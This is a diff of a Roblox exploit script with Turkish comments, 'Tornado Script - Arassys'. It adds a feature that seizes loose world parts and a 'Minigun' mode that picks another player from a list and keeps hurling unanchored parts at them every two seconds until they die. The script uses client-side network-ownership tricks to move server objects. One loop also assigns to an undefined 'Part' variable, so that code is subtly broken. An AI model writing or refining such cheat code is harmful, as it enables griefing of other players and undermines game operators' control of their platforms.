-    ArrowButton.Text = dropdownVisible and "â†‘" or "â†“"
+    ArrowButton.Text = dropdownVisible and "↑" or "↓"
     playSound("12221967")
 end)
 
--- Adjust Rotation Speed iÅŸlevi
+-- Adjust Rotation Speed işlevi
 AdjustSpeedOption.MouseButton1Click:Connect(function()
     SpeedInput.Visible = not SpeedInput.Visible
     AdjustSpeedOption.BackgroundColor3 = SpeedInput.Visible and Color3.fromRGB(100, 100, 100) or Color3.fromRGB(150, 150, 150)
     playSound("12221967")
 end)
 
--- Credits iÅŸlevi
+-- Credits işlevi
 CreditsOption.MouseButton1Click:Connect(function()
     CreditsGui.Visible = not CreditsGui.Visible
     SpeedInput.Visible = false
@@ -692,7 +877,7 @@ CreditsOption.MouseButton1Click:Connect(function()
     playSound("12221967")
 end)
 
--- Up, Down iÅŸlevi
+-- Up, Down işlevi
 UpDownOption.MouseButton1Click:Connect(function()
     HeightGui.Visible = not HeightGui.Visible
     SpeedInput.Visible = false
@@ -700,7 +885,271 @@ UpDownOption.MouseButton1Click:Connect(function()
     playSound("12221967")
 end)
 
--- ArayÃ¼zÃ¼ sÃ¼rÃ¼kleme (Ana GUI)
+-- Control Blocks Logic
+local controlBlocksEnabled = false
+local selectedBlock = nil
+local blockSpeed = 10
+local tracking = false
+local isFocused = false
+local flyEnabled = false
+
+-- Rastgele anchorsuz blok seçme
+local function selectRandomUnanchoredBlock()
+    local unanchoredBlocks = {}
+    for _, part in pairs(Workspace:GetDescendants()) do
+        if part:IsA("Part") and not part.Anchored and not part.Parent:FindFirstChild("Humanoid") and not part.Parent:FindFirstChild("Head") and part.Name ~= "Handle" then
+            table.insert(unanchoredBlocks, part)
+        end
+    end
+    if #unanchoredBlocks > 0 then
+        return unanchoredBlocks[math.random(1, #unanchoredBlocks)]
+    end
+    return nil
+end
+
+-- Bloğa hareket kontrolü ekleme
+local function setupBlockControl(block)
+    if block then
+        -- Önceki fiziksel özellikleri temizle
+        for _, x in next, block:GetChildren() do
+            if x:IsA("BodyPosition") or x:IsA("BodyVelocity") then
+                x:Destroy()
+            end
+        end
+
+        local bodyVelocity = Instance.new("BodyVelocity")
+        bodyVelocity.MaxForce = Vector3.new(math.huge, flyEnabled and math.huge or 0, math.huge) -- Fly aktifse Y ekseninde de kuvvet uygula
+        bodyVelocity.Velocity = Vector3.new(0, 0, 0)
+        bodyVelocity.Parent = block
+
+        return bodyVelocity
+    end
+    return nil
+end
+
+-- Mavi kareyi bloğa göre güncelle
+local function updateBlockSelectionFrame()
+    if selectedBlock and selectedBlock.Parent and controlBlocksEnabled then
+        local camera = Workspace.CurrentCamera
+        if camera then
+            local vector, onScreen = camera:WorldToScreenPoint(selectedBlock.Position)
+            if onScreen then
+                SelectionFrame.Position = UDim2.new(0, vector.X - SelectionFrame.Size.X.Offset / 2, 0, vector.Y - SelectionFrame.Size.Y.Offset / 2)
+                SelectionFrame.Visible = true
+            else
+                SelectionFrame.Visible = false
+            end
+        end
+    elseif controlBlocksEnabled then
+        SelectionFrame.Visible = false
+    end
+end
+
+-- Kamera takibi
+local function updateCameraTracking()
+    if tracking and selectedBlock and selectedBlock.Parent then
+        local camera = Workspace.CurrentCamera
+        if camera then
+            camera.CameraType = Enum.CameraType.Scriptable
+            local blockPos = selectedBlock.Position
+            local offset = Vector3.new(10, 10, 10) -- Bloğun biraz üstünden ve yanından bak
+            camera.CFrame = CFrame.new(blockPos + offset, blockPos)
+        end
+    end
+end
+
+-- Sürekli güncellemeler
+RunService.RenderStepped:Connect(function()
+    if controlBlocksEnabled then
+        updateBlockSelectionFrame()
+    end
+    if tracking then
+        updateCameraTracking()
+    end
+end)
+
+-- Control Blocks işlevi
+ControlBlocksOption.MouseButton1Click:Connect(function()
+    if not controlBlocksEnabled then
+        controlBlocksEnabled = true
+        ControlBlocksOption.Text = "Control Blocks (Active)"
+        ControlBlocksOption.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+
+        -- Rastgele bir anchorsuz blok seç
+        selectedBlock = selectRandomUnanchoredBlock()
+        if selectedBlock then
+            ControlGui.Visible = true
+            local bodyVelocity = setupBlockControl(selectedBlock)
+            if bodyVelocity then
+                -- WASD, E ve Q ile kontrol (Focus butonuna bağlı)
+                local moveDirection = Vector3.new(0, 0, 0)
+                UserInputService.InputBegan:Connect(function(input, gameProcessed)
+                    if gameProcessed or not controlBlocksEnabled or not isFocused then return end
+                    if input.KeyCode == Enum.KeyCode.W then
+                        moveDirection = moveDirection + Vector3.new(0, 0, -1)
+                    elseif input.KeyCode == Enum.KeyCode.S then
+                        moveDirection = moveDirection + Vector3.new(0, 0, 1)
+                    elseif input.KeyCode == Enum.KeyCode.A then
+                        moveDirection = moveDirection + Vector3.new(-1, 0, 0)
+                    elseif input.KeyCode == Enum.KeyCode.D then
+                        moveDirection = moveDirection + Vector3.new(1, 0, 0)
+                    elseif input.KeyCode == Enum.KeyCode.E and flyEnabled then
+                        moveDirection = moveDirection + Vector3.new(0, 1, 0)
+                    elseif input.KeyCode == Enum.KeyCode.Q and flyEnabled then
+                        moveDirection = moveDirection + Vector3.new(0, -1, 0)
+                    end
+                    if selectedBlock and bodyVelocity then
+                        bodyVelocity.Velocity = moveDirection * blockSpeed
+                    end
+                end)
+
+                UserInputService.InputEnded:Connect(function(input, gameProcessed)
+                    if gameProcessed or not controlBlocksEnabled or not isFocused then return end
+                    if input.KeyCode == Enum.KeyCode.W then
+                        moveDirection = moveDirection - Vector3.new(0, 0, -1)
+                    elseif input.KeyCode == Enum.KeyCode.S then
+                        moveDirection = moveDirection - Vector3.new(0, 0, 1)
+                    elseif input.KeyCode == Enum.KeyCode.A then
+                        moveDirection = moveDirection - Vector3.new(-1, 0, 0)
+                    elseif input.KeyCode == Enum.KeyCode.D then
+                        moveDirection = moveDirection - Vector3.new(1, 0, 0)
+                    elseif input.KeyCode == Enum.KeyCode.E and flyEnabled then
+                        moveDirection = moveDirection - Vector3.new(0, 1, 0)
+                    elseif input.KeyCode == Enum.KeyCode.Q and flyEnabled then
+                        moveDirection = moveDirection - Vector3.new(0, -1, 0)
+                    end
+                    if selectedBlock and bodyVelocity then
+                        bodyVelocity.Velocity = moveDirection * blockSpeed
+                    end
+                end)
+            end
+        else
+            -- Blok bulunamazsa uyarı
+            StarterGui:SetCore("SendNotification", {
+                Title = "Control Blocks",
+                Text = "No unanchored blocks found!",
+                Duration = 3
+            })
+            controlBlocksEnabled = false
+            ControlBlocksOption.Text = "Control Blocks"
+            ControlBlocksOption.BackgroundColor3 = Color3.fromRGB(128, 0, 128)
+        end
+    else
+        controlBlocksEnabled = false
+        flyEnabled = false -- Fly modunu kapat
+        FlyButton.Text = "Fly: Off"
+        FlyButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+        ControlBlocksOption.Text = "Control Blocks"
+        ControlBlocksOption.BackgroundColor3 = Color3.fromRGB(128, 0, 128)
+        ControlGui.Visible = false
+        tracking = false -- Kamera takibini kapat
+        ViewButton.Text = "View: Off"
+        ViewButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+        FocusButton.Text = "Focus: Off" -- Focus'u kapat
+        FocusButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+        isFocused = false -- Hareketi devre dışı bırak
+        Workspace.CurrentCamera.CameraType = Enum.CameraType.Custom -- Kamerayı normale döndür
+        selectedBlock = nil
+        SelectionFrame.Visible = false -- Mavi kareyi gizle
+    end
+    playSound("12221967")
+end)
+
+-- View Butonu işlevi
+ViewButton.MouseButton1Click:Connect(function()
+    tracking = not tracking
+    if tracking then
+        ViewButton.Text = "View: On"
+        ViewButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+    else
+        ViewButton.Text = "View: Off"
+        ViewButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+        Workspace.CurrentCamera.CameraType = Enum.CameraType.Custom -- Kamerayı normale döndür
+    end
+    playSound("12221967")
+end)
+
+-- Focus Butonu işlevi
+FocusButton.MouseButton1Click:Connect(function()
+    isFocused = not isFocused
+    if isFocused then
+        FocusButton.Text = "Focus: On"
+        FocusButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+    else
+        FocusButton.Text = "Focus: Off"
+        FocusButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+    end
+    playSound("12221967")
+end)
+
+-- Fly Butonu işlevi
+FlyButton.MouseButton1Click:Connect(function()
+    flyEnabled = not flyEnabled
+    if flyEnabled then
+        FlyButton.Text = "Fly: On"
+        FlyButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+        -- BodyVelocity'i güncelle (Y ekseninde kuvvet ekle)
+        if selectedBlock then
+            local bodyVelocity = selectedBlock:FindFirstChildOfClass("BodyVelocity")
+            if bodyVelocity then
+                bodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+            end
+        end
+    else
+        FlyButton.Text = "Fly: Off"
+        FlyButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+        -- BodyVelocity'i güncelle (Y ekseninde kuvveti kaldır)
+        if selectedBlock then
+            local bodyVelocity = selectedBlock:FindFirstChildOfClass("BodyVelocity")
+            if bodyVelocity then
+                bodyVelocity.MaxForce = Vector3.new(math.huge, 0, math.huge)
+                bodyVelocity.Velocity = Vector3.new(bodyVelocity.Velocity.X, 0, bodyVelocity.Velocity.Z) -- Y hızını sıfırla
+            end
+        end
+    end
+    playSound("12221967")
+end)
+
+-- Hız ayarı (TextBox)
+BlockSpeedInput.FocusLost:Connect(function(enterPressed)
+    if enterPressed then
+        local inputValue = tonumber(BlockSpeedInput.Text)
+        if inputValue then
+            blockSpeed = math.clamp(inputValue, 1, 100)
+            BlockSpeedInput.Text = tostring(blockSpeed)
+            SliderIndicator.Position = UDim2.new((blockSpeed - 1) / 99, 0, 0, -5)
+            playSound("12221967")
+        else
+            BlockSpeedInput.Text = tostring(blockSpeed)
+        end
+    end
+end)
+
+-- Hız kaydırıcısı (Slider) işlevi
+local draggingSlider = false
+SpeedSlider.MouseButton1Down:Connect(function()
+    draggingSlider = true
+end)
+
+UserInputService.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        draggingSlider = false
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if draggingSlider and input.UserInputType == Enum.UserInputType.MouseMovement then
+        local mousePos = UserInputService:GetMouseLocation()
+        local sliderPos = SpeedSlider.AbsolutePosition
+        local sliderSize = SpeedSlider.AbsoluteSize
+        local relativeX = math.clamp((mousePos.X - sliderPos.X) / sliderSize.X, 0, 1)
+        blockSpeed = math.clamp(math.floor(relativeX * 99) + 1, 1, 100)
+        SliderIndicator.Position = UDim2.new(relativeX, 0, 0, -5)
+        BlockSpeedInput.Text = tostring(blockSpeed)
+    end
+end)
+
+-- Arayüzü sürükleme (Ana GUI)
 local draggingMain
 local dragInputMain
 local dragStartMain
@@ -737,7 +1186,7 @@ UserInputService.InputChanged:Connect(function(input)
     end
 end)
 
--- ArayÃ¼zÃ¼ sÃ¼rÃ¼kleme (HeightGui)
+-- Arayüzü sürükleme (HeightGui)
 local draggingHeight
 local dragInputHeight
 local dragStartHeight
@@ -774,7 +1223,7 @@ UserInputService.InputChanged:Connect(function(input)
     end
 end)
 
--- ArayÃ¼zÃ¼ sÃ¼rÃ¼kleme (CreditsGui)
+-- Arayüzü sürükleme (CreditsGui)
 local draggingCredits
 local dragInputCredits
 local dragStartCredits
@@ -808,6 +1257,43 @@ end)
 UserInputService.InputChanged:Connect(function(input)
     if input == dragInputCredits and draggingCredits then
         updateCredits(input)
+    end
+end)
+
+-- Arayüzü sürükleme (ControlGui)
+local draggingControl
+local dragInputControl
+local dragStartControl
+local startPosControl
+
+local function updateControl(input)
+    local delta = input.Position - dragStartControl
+    ControlGui.Position = UDim2.new(startPosControl.X.Scale, startPosControl.X.Offset + delta.X, startPosControl.Y.Scale, startPosControl.Y.Offset + delta.Y)
+end
+
+ControlGui.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        draggingControl = true
+        dragStartControl = input.Position
+        startPosControl = ControlGui.Position
+        
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                draggingControl = false
+            end
+        end)
+    end
+end)
+
+ControlGui.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        dragInputControl = input
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if input == dragInputControl and draggingControl then
+        updateControl(input)
     end
 end)
 
@@ -891,7 +1377,7 @@ local angleOffset = 0
 local parts = {}
 
 local function addPart(part)
-    if ForcePart(part) then
+    if ringPartsEnabled and ForcePart(part) then
         if not table.find(parts, part) then
             table.insert(parts, part)
             Network.RetainPart(part)
@@ -900,40 +1386,39 @@ local function addPart(part)
 end
 
 local function removePart(part)
-    local index = table.find(parts, part)
-    if index then
-        table.remove(parts, index)
-        local indexInNetwork = table.find(Network.BaseParts, part)
-        if indexInNetwork then
-            table.remove(Network.BaseParts, indexInNetwork)
+    if ringPartsEnabled then
+        local index = table.find(parts, part)
+        if index then
+            table.remove(parts, index)
+            local indexInNetwork = table.find(Network.BaseParts, part)
+            if indexInNetwork then
+                table.remove(Network.BaseParts, indexInNetwork)
+            end
         end
     end
 end
 
-for _, part in pairs(Workspace:GetDescendants()) do
-    addPart(part)
-end
-
-Workspace.DescendantAdded:Connect(addPart)
-Workspace.DescendantRemoving:Connect(removePart)
-
+-- Yalnızca mod aktifken parçaları ekle
 RunService.Heartbeat:Connect(function(deltaTime)
-    if not ringPartsEnabled then return end
-    
-    angleOffset = angleOffset + (rotationSpeed * deltaTime)
-    local humanoidRootPart = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-    if humanoidRootPart then
-        local heightOffset = (motionType == "Tornado") and tornadoHeightOffset or 0
-        local center = humanoidRootPart.Position + Vector3.new(0, heightOffset, 0)
-        for i, part in pairs(parts) do
-            if part.Parent and not part.Anchored then
-                local angle = (angleOffset + (i * 2 * math.pi / #parts)) % (2 * math.pi)
-                local targetPos = center + Vector3.new(math.cos(angle) * radius, 0, math.sin(angle) * radius)
-                Part.Position = targetPos
+    if ringPartsEnabled then
+        angleOffset = angleOffset + (rotationSpeed * deltaTime)
+        local humanoidRootPart = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+        if humanoidRootPart then
+            local heightOffset = (motionType == "Tornado") and tornadoHeightOffset or 0
+            local center = humanoidRootPart.Position + Vector3.new(0, heightOffset, 0)
+            for i, part in pairs(parts) do
+                if part.Parent and not part.Anchored then
+                    local angle = (angleOffset + (i * 2 * math.pi / #parts)) % (2 * math.pi)
+                    local targetPos = center + Vector3.new(math.cos(angle) * radius, 0, math.sin(angle) * radius)
+                    Part.Position = targetPos
+                end
             end
         end
     end
 end)
+
+Workspace.DescendantAdded:Connect(addPart)
+Workspace.DescendantRemoving:Connect(removePart)
 
 -- Minigun Logic
 local minigunActive = false
@@ -941,7 +1426,59 @@ local targetPlayer = nil
 local isPulling = false
 local pullConnections = {}
 
--- Anchorsuz bloklarÄ± toplama
+-- Oyuncu Listesi Frame
+local playerListFrame = Instance.new("Frame")
+playerListFrame.Size = UDim2.new(0, 200, 0, 150)
+playerListFrame.Position = UDim2.new(0.5, -100, 1, -160)
+playerListFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+playerListFrame.BorderSizePixel = 0
+playerListFrame.Visible = false
+playerListFrame.Parent = ScreenGui
+
+local playerScrollingFrame = Instance.new("ScrollingFrame")
+playerScrollingFrame.Size = UDim2.new(1, 0, 1, 0)
+playerScrollingFrame.Position = UDim2.new(0, 0, 0, 0)
+playerScrollingFrame.BackgroundTransparency = 1
+playerScrollingFrame.BorderSizePixel = 0
+playerScrollingFrame.ScrollBarThickness = 6
+playerScrollingFrame.Parent = playerListFrame
+
+-- Oyuncu listesini güncelle
+local function updatePlayerList()
+    for _, button in pairs(playerScrollingFrame:GetChildren()) do
+        if button:IsA("TextButton") then
+            button:Destroy()
+        end
+    end
+    local players = Players:GetPlayers()
+    local yOffset = 0
+    for _, player in pairs(players) do
+        if player ~= LocalPlayer then
+            local playerButton = Instance.new("TextButton")
+            playerButton.Size = UDim2.new(1, 0, 0, 30)
+            playerButton.Position = UDim2.new(0, 0, 0, yOffset)
+            playerButton.Text = player.DisplayName
+            playerButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+            playerButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+            playerButton.Font = Enum.Font.Fondamento
+            playerButton.TextSize = 14
+            playerButton.Parent = playerScrollingFrame
+            playerButton.MouseButton1Click:Connect(function()
+                targetPlayer = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+                if targetPlayer then
+                    SelectionFrame.Visible = true
+                    LaunchButton.Visible = true
+                    playerListFrame.Visible = false
+                    playSound("12221967")
+                end
+            end)
+            yOffset = yOffset + 30
+        end
+    end
+    playerScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, yOffset)
+end
+
+-- Anchorsuz blokları toplama
 local function collectUnanchoredParts()
     local unanchoredParts = {}
     for _, part in pairs(Workspace:GetDescendants()) do
@@ -952,7 +1489,7 @@ local function collectUnanchoredParts()
     return unanchoredParts
 end
 
--- Ã‡ekim gÃ¼cÃ¼ uygulama
+-- Çekim gücü uygulama
 local function applyPullToParts(target)
     local unanchoredParts = collectUnanchoredParts()
     for _, part in pairs(unanchoredParts) do
@@ -981,7 +1518,7 @@ local function applyPullToParts(target)
     end)
 end
 
--- Ã‡ekimi durdurma
+-- Çekimi durdurma
 local function stopPulling()
     for _, connection in pairs(pullConnections) do
         if connection then
@@ -992,70 +1529,57 @@ local function stopPulling()
     isPulling = false
 end
 
--- Minigun iÅŸlevi
+-- Minigun işlevi (Açma ve kapama)
 MinigunOption.MouseButton1Click:Connect(function()
     if not minigunActive then
         minigunActive = true
         MinigunOption.Text = "Minigun (Active)"
         MinigunOption.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+        playerListFrame.Visible = true
+        updatePlayerList()
+        playSound("12221967")
+    else
+        -- Minigun modunu kapat
+        stopPulling()
+        targetPlayer = nil
+        SelectionFrame.Visible = false
+        LaunchButton.Visible = false
+        StopButton.Visible = false
+        ExitButton.Visible = false
+        playerListFrame.Visible = false
+        minigunActive = false
+        MinigunOption.Text = "Minigun"
+        MinigunOption.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
         playSound("12221967")
     end
 end)
 
--- Mavi kareyi gÃ¼ncelleme
+-- Mavi kareyi oyuncuya göre güncelle (Minigun modu için)
 local function updateSelectionFrame()
-    if targetPlayer and targetPlayer.Parent then
+    if targetPlayer and targetPlayer.Parent and minigunActive then
         local camera = Workspace.CurrentCamera
         if camera then
             local vector, onScreen = camera:WorldToScreenPoint(targetPlayer.Position)
             if onScreen then
-                SelectionFrame.Position = UDim2.new(0, vector.X - 50, 0, vector.Y - 50)
+                SelectionFrame.Position = UDim2.new(0, vector.X - SelectionFrame.Size.X.Offset / 2, 0, vector.Y - SelectionFrame.Size.Y.Offset / 2)
                 SelectionFrame.Visible = true
             else
                 SelectionFrame.Visible = false
             end
         end
+    elseif minigunActive then
+        SelectionFrame.Visible = false
     end
 end
 
--- Oyuncuya tÄ±klama ile seÃ§im
-UserInputService.InputBegan:Connect(function(input, gameProcessed)
-    if gameProcessed then return end
-    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-        if not minigunActive then return end
-        if LaunchButton.Visible or StopButton.Visible or ExitButton.Visible then return end
-        local mouse = LocalPlayer:GetMouse()
-        local target = mouse.Target
-        if target then
-            local humanoid = target.Parent:FindFirstChild("Humanoid")
-            if humanoid and humanoid.Parent ~= LocalPlayer.Character then
-                targetPlayer = humanoid.Parent:FindFirstChild("HumanoidRootPart")
-                if targetPlayer then
-                    SelectionFrame.Visible = true
-                    LaunchButton.Visible = true
-                    updateSelectionFrame()
-                    local renderConnection
-                    renderConnection = RunService.RenderStepped:Connect(function()
-                        if not targetPlayer or not SelectionFrame.Visible then
-                            renderConnection:Disconnect()
-                            return
-                        end
-                        updateSelectionFrame()
-                    end)
-                    task.delay(3, function()
-                        if SelectionFrame.Visible and not LaunchButton.Visible and not StopButton.Visible and not ExitButton.Visible then
-                            SelectionFrame.Visible = false
-                            LaunchButton.Visible = false
-                            targetPlayer = nil
-                        end
-                    end)
-                end
-            end
-        end
+-- Sürekli güncelleme (Minigun modu için)
+RunService.RenderStepped:Connect(function()
+    if minigunActive then
+        updateSelectionFrame()
     end
 end)
 
--- Launch Butonu
+-- Launch Butonu (Tekrar çarpma döngüsü ile)
 LaunchButton.MouseButton1Click:Connect(function()
     if targetPlayer and targetPlayer.Parent then
         isPulling = true
@@ -1063,6 +1587,36 @@ LaunchButton.MouseButton1Click:Connect(function()
         StopButton.Visible = true
         applyPullToParts(targetPlayer)
         playSound("12221967")
+
+        -- Hedef oyuncunun Humanoid'ini al
+        local humanoid = targetPlayer.Parent:FindFirstChild("Humanoid")
+        if humanoid then
+            -- Ölüm kontrolü
+            local diedConnection
+            local pullTask
+            local playerDied = false
+
+            -- Ölüm olayını dinle
+            diedConnection = humanoid.Died:Connect(function()
+                playerDied = true
+                diedConnection:Disconnect()
+                if pullTask then
+                    task.cancel(pullTask)
+                end
+            end)
+
+            -- 2 saniyede bir tekrar çarpma döngüsü
+            local function repeatPull()
+                if not isPulling or not targetPlayer or not targetPlayer.Parent or playerDied then
+                    return
+                end
+                stopPulling() -- Önceki çekimi durdur
+                applyPullToParts(targetPlayer) -- Yeni çekim uygula
+                pullTask = task.delay(2, repeatPull) -- 2 saniye sonra tekrar
+            end
+
+            repeatPull()
+        end
     end
 end)
 
@@ -1074,7 +1628,7 @@ StopButton.MouseButton1Click:Connect(function()
     playSound("12221967")
 end)
 
--- Ã‡arpÄ± Butonu
+-- Çarpı Butonu
 ExitButton.MouseButton1Click:Connect(function()
     stopPulling()
     targetPlayer = nil
@@ -1085,109 +1639,6 @@ ExitButton.MouseButton1Click:Connect(function()
     minigunActive = false
     MinigunOption.Text = "Minigun"
     MinigunOption.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+    playerListFrame.Visible = false
     playSound("12221967")
 end)
-
--- DÃ¼ÄŸme iÅŸlevleri
-ToggleButton.MouseButton1Click:Connect(function()
-    ringPartsEnabled = not ringPartsEnabled
-    if motionType == "Tornado" then
-        ToggleButton.Text = ringPartsEnabled and "Tornado Parts On" or "Tornado Parts Off"
-    else
-        ToggleButton.Text = ringPartsEnabled and "Saturn Parts On" or "Saturn Parts Off"
-    end
-    ToggleButton.BackgroundColor3 = ringPartsEnabled and Color3.fromRGB(50, 205, 50) or Color3.fromRGB(160, 82, 45)
-    playSound("12221967")
-end)
-
-DecreaseRadius.MouseButton1Click:Connect(function()
-    radius = math.max(1, radius - 2)
-    RadiusDisplay.Text = "Radius: " .. radius
-    playSound("12221967")
-end)
-
-IncreaseRadius.MouseButton1Click:Connect(function()
-    radius = math.min(1000, radius + 2)
-    RadiusDisplay.Text = "Radius: " .. radius
-    playSound("12221967")
-end)
-
--- Up, Down Buton Ä°ÅŸlevleri
-UpButton.MouseButton1Click:Connect(function()
-    if motionType == "Tornado" then
-        tornadoHeightOffset = math.clamp(tornadoHeightOffset + 5, -100, 1000)
-        HeightDisplay.Text = "Height: " .. tornadoHeightOffset
-        playSound("12221967")
-    end
-end)
-
-DownButton.MouseButton1Click:Connect(function()
-    if motionType == "Tornado" then
-        tornadoHeightOffset = math.clamp(tornadoHeightOffset - 5, -100, 1000)
-        HeightDisplay.Text = "Height: " .. tornadoHeightOffset
-        playSound("12221967")
-    end
-end)
-
--- Rotation Speed AyarÄ±
-SpeedInput.FocusLost:Connect(function(enterPressed)
-    if enterPressed then
-        local inputValue = tonumber(SpeedInput.Text)
-        if inputValue then
-            rotationSpeed = math.clamp(inputValue, 0, 100)
-            SpeedInput.Text = tostring(rotationSpeed)
-            playSound("12221967")
-        else
-            SpeedInput.Text = tostring(rotationSpeed)
-        end
-    end
-end)
-
--- AÃ§Ä±lÄ±r menÃ¼ seÃ§enekleri
-TornadoOption.MouseButton1Click:Connect(function()
-    motionType = "Tornado"
-    ToggleButton.Text = ringPartsEnabled and "Tornado Parts On" or "Tornado Parts Off"
-    DropdownFrame.Visible = false
-    dropdownVisible = false
-    ArrowButton.Text = "â†“"
-    playSound("12221967")
-end)
-
-SaturnOption.MouseButton1Click:Connect(function()
-    motionType = "Saturn"
-    ToggleButton.Text = ringPartsEnabled and "Saturn Parts On" or "Saturn Parts Off"
-    DropdownFrame.Visible = false
-    dropdownVisible = false
-    ArrowButton.Text = "â†“"
-    playSound("12221967")
-end)
-
--- Oyuncu kÃ¼Ã§Ã¼k resmi
-local success, userId = pcall(function()
-    return Players:GetUserIdFromNameAsync("Arasbey232323")
-end)
-if success and userId then
-    local thumbType = Enum.ThumbnailType.HeadShot
-    local thumbSize = Enum.ThumbnailSize.Size620x720
-    local content, isReady = Players:GetUserThumbnailAsync(userId, thumbType, thumbSize)
-    if isReady then
-        StarterGui:SetCore("SendNotification", {
-            Title = "Tornado Script - Arassys",
-            Text = ":)",
-            Icon = content,
-            Duration = 5
-        })
-    end
-end
-
--- Sohbet mesajÄ±
-local function SendChatMessage(message)
-    pcall(function()
-        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-            local textChannel = TextChatService.TextChannels.RBXGeneral
-            textChannel:SendAsync(message)
-        else
-            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
-        end
-    end)
-end
